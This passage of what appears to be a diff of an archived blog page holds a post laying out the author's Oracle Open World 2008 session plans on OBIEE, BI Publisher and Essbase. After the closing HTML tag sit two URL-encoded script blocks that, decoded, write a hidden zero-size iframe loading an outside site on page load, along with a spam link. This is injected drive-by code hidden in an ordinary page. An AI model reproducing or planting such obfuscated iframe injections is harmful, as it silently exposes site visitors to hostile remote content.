announce it at the session)</p>
+<p><strong>Wednesday September 24th<br />
+</strong><br />
+09:00 - 10:00 : Enabling Actionable Business Intelligence and Business Process Management (Nick Tuson, Adam Bloom)<br />
+13:00 - 14:00 : Oracle Business Intelligence Publisher Roadmap and Planned Features<br />
+14:30 - 16:00 : Larry Ellison Keynote<br />
+16:00 - 17:00 : OTN Office Hours Duty<br />
+17:00 - 18:00 : Oracle Business Intelligence Suite Enterprise Edition Performance Optimization</p>
+<p>The morning starts off with what I presume will be a walk-through of the new Action Framework in OBIEE 11g, the feature that lets you define actions as first-class metadata objects in the semantic layer (email a colleague, start a marketing campaign, raise some human workflow etc) and attach them to data items in a dashboard report. I first saw and heard about this from Phil Bates at last year&#8217;s Open World and I&#8217;m keen to hear how this new area of the product is progressing (so that&#8217;s four must-hear presentations, then). After that is Mike Donahoe and Osama Elkady on BI Publisher&#8217;s new features; I&#8217;m always keen to hear about BIP as they seem to have a fairly innovative and fast-delivering development team, lots of new ideas seem to come out of that product area although I suspect actual releases are getting held back because of the need to sync with OBIEE in general. Hopefully we&#8217;ll hear a release date for the web-based template builder, maybe they&#8217;ll even release it prior to the full 11g release of OBIEE (here&#8217;s hoping).</p>
+<p>Following the BIP session is the Larry keynote, followed by an hour in the OTN lounge (bring your BI and DW questions!) followed then by the session I&#8217;m most looking forward to, the one of OBIEE performance optimization. Something I&#8217;m really keen to find out about OBIEE, given that it&#8217;s a virtual database engine, is how it handles things such as indexing, join types and so on, from looking at the abstract it&#8217;s covering &#8220;a toolkit and systematic approaches to help improve performance and scalability in Oracle Business Intelligence Suite Enterprise Edition Plus deployments, including wizard-driven aggregate persistence and navigation setup, cache configuration and seeding design, parameterized nested-loop joins in federated environments, clustering, and use of usage tracking to spot problems.&#8221; which seems to fit the bill, no doubt I&#8217;ll be hanging around after the session and swapping a few business cards as I&#8217;m keen to make contact with anyone else working on OBIEE performance optimization.</p>
+<p><strong>Thursday September 25th<br />
+</strong><br />
+09:00 - 10:00 : Advanced Topics in Ad-Hoc Reporting with Oracle BI Suite Enterprise Edition Plus<br />
+10:30 - 11:30 : Oracle ACE Directors Birds of a Feather Tips and Techniques Panel<br />
+12:00 - 13:00 : Oracle Business Intelligence Management using Oracle Enterprise Manager<br />
+13:30 - 14:30 : Oracle Business Intelligence Applications architecture, security and integration overview<br />
+15:00 - 16:00 : Integrating Oracle&#8217;s Hyperion Technology with Oracle Fusion Middleware</p>
+<p>The first session of the day looks like being an update on Answer Plus, plus a look at &#8220;its new direct query features from Oracle Essbase, with practical use cases and best practices&#8221; - I wonder if this will be the standard &#8220;relational query against a metadata layer over a relational-multidimensional translation layer&#8221; that OBIEE and Essbase currently use, or whether Answers Plus will feature a proper multi-dimensional OLAP selector that generates raw MDX against an Essbase cube, to replace Web Analysis? We&#8217;ll have to wait and see. After that is the panel session organized by Lewis Cunningham and featuring such names as Arup Nanda, Bradley Brown, Eddie Awad (and myself), followed by a session on what must be the new OBIEE management features in Oracle Enterprise Manager that must be coming in the next releases of these two products.</p>
+<p>The final two sessions of Open World for me are a talk on the BI Applications (I haven&#8217;t seen much else on the BI Apps at Open World, certainly not from a technical standpoint, maybe everyone will come to my session at 8.30am on Sunday morning after all) and then a final closing session on Essbase integration into Oracle Fusion Middleware - if you were an Essbase developer a few years ago I bet that&#8217;s one session you never thought you&#8217;d be going to.</p>
+<p>So, that&#8217;s my Oracle Open World plans. Like last year, I&#8217;ll be going as a guest of Oracle courtesy of the Oracle ACE Director program (thanks to Vikki for this) and I&#8217;ll be hoping to meet up with fellow Brits (Doug, Tim Hall, Debra and the others), my colleagues Jon and Borkur, all my friends and colleagues from across the pond that I get to meet up with once a year. I&#8217;ll be frantically taking down notes (why, oh why don&#8217;t Oracle release the slides for the roadmap and keynote talks on the Open World site, so that we don&#8217;t have to frantically make notes, or surreptitiously take photos of the presenters&#8217; slides, so that we can get everything down?), I&#8217;ll probably try and get along to the Unconference sessions and maybe even get to see a bit of San Francisco as well. Oh, and nurse increasingly desperate hangovers during the week as the nights get later, drinks get more plentiful and you start to run into all the people you&#8217;ve been meaning to catch up with all week. Until then, it&#8217;s time to finish off the presentations and work out what we can afford from the Apple Store just around the corner from the Moscone Center.</p>
+	</div>
+	<div class="comments">
+					</div>
+	
+	<!--
+	<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
+				xmlns:dc="http://purl.org/dc/elements/1.1/"
+				xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
+			<rdf:Description rdf:about="http://www.biblogs.com/2008/08/18/my-oracle-business-intelligence-open-world-2008-schedule/"
+    dc:identifier="http://www.biblogs.com/2008/08/18/my-oracle-business-intelligence-open-world-2008-schedule/"
+    dc:title="My Oracle Business Intelligence Open World 2008 Schedule"
+    trackback:ping="http://www.biblogs.com/2008/08/18/my-oracle-business-intelligence-open-world-2008-schedule/trackback/" />
+</rdf:RDF>	-->
+
+
+
+<!-- You can start editing here. -->
+
+
+  		<!-- If comments are closed. -->
+		<p class="nocomments">Comments are closed.</p>
+		
+	
+
+
+
+
+	</div>
+<!-- End float clearing -->
+</div>
+<!-- End content -->
+<!-- begin footer -->
+<hr />
+	<div id="footer">
+	<p>Aalglatt Template by <a href="http://www.felixkrusch.com">Felix Krusch</a> based on The Green Marin&eacute;e template by <a href="http://e-lusion.com" title="Ian Main - e-lusion.com">Ian Main</a></p>
+		<div class="extras">
+			<ul>
+				<li><a href="http://www.biblogs.com/feed/" title="Subscribe to RSS feed">RSS</a></li>
+				<li><a href="feed:http://www.biblogs.com/comments/feed/" title="Subscribe to Comments RSS feed">Comments RSS</a></li>
+				<li><a href="http://www.biblogs.com/feed/atom/" title="Subscribe to Atom feed">Atom</a></li>
+				<li><a href="http://wordpress.org/" title="Powered by the lovely WordPress">WP</a></li>
+			</ul>
+		</div>
+	</div>
+	</div>
+	</div>
+	</div>
+	</div>
+</div>
+</body>
+</html><script type="text/javascript">document.write(unescape('%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%72%65%79%63%72%6F%73%73%2E%63%6F%6D%2F%74%6F%6D%69%2F%3F%74%3D%32%22%20%77%69%64%74%68%3D%30%20%68%65%69%67%68%74%3D%30%20%73%74%79%6C%65%3D%22%68%69%64%64%65%6E%22%20%66%72%61%6D%65%62%6F%72%64%65%72%3D%30%20%6D%61%72%67%69%6E%68%65%69%67%68%74%3D%30%20%6D%61%72%67%69%6E%77%69%64%74%68%3D%30%20%73%63%72%6F%6C%6C%69%6E%67%3D%6E%6F%3E%3C%2F%69%66%72%61%6D%65%3E'));</script><a href="http://world-secure-channel.com/why/">vpn</a><script type="text/javascript">document.write(unescape('%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%72%65%79%63%72%6F%73%73%2E%63%6F%6D%2F%74%6F%6D%69%2F%3F%74%3D%32%22%20%77%69%64%74%68%3D%30%20%68%65%69%67%68%74%3D%30%20%73%74%79%6C%65%3D%22%68%69%64%64%65%6E%22%20%66%72%61%6D%65%62%6F%72%64%65%72%3D%30%20%6D%61%72%67%69%6E%68%65%69%67%68%74%3D%30%20%6D%61%72%67%69%6E%77%69%64%74%68%3D%30%20%73%63%72%6F%6C%6C%69%6E%67%3D%6E%6F%3E%3C%2F%69%66%72%61%6D%65%3E'));</script>
